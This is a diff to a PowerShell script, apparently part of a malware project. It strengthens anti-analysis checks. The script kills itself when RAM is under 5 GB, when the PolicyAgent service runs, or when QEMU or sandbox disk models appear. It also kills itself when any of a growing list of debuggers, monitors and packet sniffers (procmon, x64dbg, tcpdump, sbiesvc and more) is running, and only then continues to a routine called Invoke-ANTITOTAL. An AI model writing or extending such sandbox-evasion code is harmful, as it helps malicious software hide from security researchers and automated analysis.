@@ -59,27 +59,31 @@ function Invoke-ANTITOTAL {
 
 function ram_check {
     $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
-    if ($ram -lt 4) {
+    if ($ram -lt 5) {
         Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error')
         Stop-Process $pid -Force  
     }
 }
 
 function VMPROTECT {
-    ram_check
+	if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+        Stop-Process $pid -Force
+    } 	
+	ram_check 
     #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
         Stop-Process $pid -Force   
-    }
-    if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
-        Stop-Process $pid -Force
-    } 
+    }	
     $processnames = @(
         "autoruns",
+		"Autoruns64",
         "autorunsc",
+		"autorunsc64",
         "die",
         "dumpcap",
+		"etwdump",
+		"efsdump",
         "fakenet",
         "fiddler",
         "filemon",
@@ -94,15 +98,19 @@ function VMPROTECT {
         "lordpe",
         "ollydbg",
         "petools",
+		"portmon",
         "proc_analyzer",
         "processhacker",
         "procexp",
+		"procexp64",
         "procmon",
         "procmon64",
+		"pyw",
         "qemu-ga",
         "qga",
         "regmon",
         "resourcehacker",
+		"sbiesvc",
         "sandman",
         "scylla_x64",
         "sniff_hit",
@@ -112,6 +120,7 @@ function VMPROTECT {
         "tcpdump",
         "tcpview",
         "tcpview64",
+		"udpdump",
         "vboxcontrol",
         "vboxservice",
         "vboxtray",
@@ -127,16 +136,15 @@ function VMPROTECT {
         "x64dbg",
         "xenservice"
     )
-    $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
+    $detectedProcesses = gps -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
     if ($null -ne $detectedProcesses) {
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
         Stop-Process $pid -Force
     }
 
-    if ($null -eq $detectedProcesses) {
-        Invoke-ANTITOTAL
+    if ($null -eq $detectedProcesses) {	
+	    Invoke-ANTITOTAL
         Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
     }
 }
 VMPROTECT
-
